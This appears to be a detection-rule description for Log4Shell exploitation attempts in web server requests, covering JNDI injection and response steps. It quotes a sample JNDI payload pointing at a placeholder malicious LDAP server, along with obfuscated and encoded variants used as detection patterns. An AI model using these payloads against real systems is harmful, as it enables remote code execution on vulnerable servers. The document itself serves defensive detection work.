## Overview

Detect when a web server received requests containing Log4j/Log4Shell exploitation patterns (CVE-2021-44228, CVE-2021-45046). This detection focuses on identifying attempts to exploit a critical remote code execution vulnerability in the widely-used Log4j Java logging framework.

The Log4Shell vulnerability exploits Log4j's JNDI (Java Naming and Directory Interface) lookup functionality, which allows for dynamic loading of Java classes. When Log4j logs a string containing a JNDI lookup expression (like `${jndi:ldap://malicious-server/payload}`), it attempts to resolve the reference, potentially executing arbitrary code from a remote source. Attackers typically inject these JNDI expressions into fields that are likely to be logged, such as HTTP headers, form fields, and URL parameters.

Multiple variations of the attack exist, including obfuscation techniques to bypass detection, such as nested expressions, HTML entity encoding, and using string manipulation functions within the JNDI expression. This detection identifies both simple and sophisticated attack attempts by scanning for common JNDI injection patterns in HTTP request URIs and User-Agent headers, including standard patterns (`${jndi:...}`), nested expressions (`${${...}}`), encoded variants (`&dollar;{jndi:...}`), and obfuscated patterns using Log4j's lookup features (`${lower:${upper:j}ndi}`).

When this detection triggers, security teams should immediately isolate affected systems if possible, check if the exploitation attempt was successful by looking for unusual outbound connections or newly created files, update all Log4j installations to patched versions (2.17.0 or newer), implement web application firewall rules to block JNDI lookup patterns, scan all applications and dependencies for Log4j vulnerabilities, and enhance logging to identify potential compromises. While this detection may occasionally trigger on security scanning or legitimate applications using ${} syntax in parameters, these cases are extremely rare in normal web traffic.

**References**:
- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046)
- [OWASP: Log4j Security Vulnerabilities](https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities)
- [CISA Alert: Log4j Vulnerabilities](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [MITRE ATT&CK: Command and Scripting Interpreter (T1059)](https://attack.mitre.org/techniques/T1059/)